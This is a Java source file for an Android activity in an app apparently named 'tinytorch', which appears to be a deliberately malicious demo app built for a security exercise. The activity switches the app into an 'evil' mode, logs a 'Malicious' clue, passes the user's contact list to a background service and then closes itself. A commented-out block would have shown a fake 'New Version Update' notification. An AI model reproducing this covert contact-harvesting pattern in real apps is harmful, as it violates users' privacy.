package com.sec.iitr.tinytorch;

import android.content.Intent;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import java.util.HashMap;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String> contacts_List = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getSupportActionBar().hide();
        MainActivity.version="17";
        overridePendingTransition(R.anim.fadein, R.anim.fadeout);
        setContentView(R.layout.activity_notification);
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");
        contacts_List = (HashMap<String,String>) getIntent().getExtras().get("CONTACT_LIST");

        Intent intent = new
                Intent(this, BackgroundService.class);
        intent.putExtra("CONTACT_LIST", contacts_List);

        startService(intent);
        new Handler().postDelayed(new Runnable(){
            @Override
            public void run() {
                /* Create an Intent that will start the Menu-Activity. */
                overridePendingTransition(R.anim.fadein, R.anim.fadeout);
                onBackPressed();
                overridePendingTransition(R.anim.fadein, R.anim.fadeout);
            }
        }, 3000);

       /* NotificationCompat.Builder mBuilder =   new NotificationCompat.Builder(this)
                .setSmallIcon(R.drawable.icon) // notification icon
                .setContentTitle("Notification!") // title for notification
                .setContentText("New Version Update") // message for notification
                .setAutoCancel(true); // clear notification after click
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this,0,intent,Intent.FLAG_ACTIVITY_NEW_TASK);
        mBuilder.setContentIntent(pi);
        NotificationManager mNotificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        mNotificationManager.notify(0, mBuilder.build());*/
    }
}
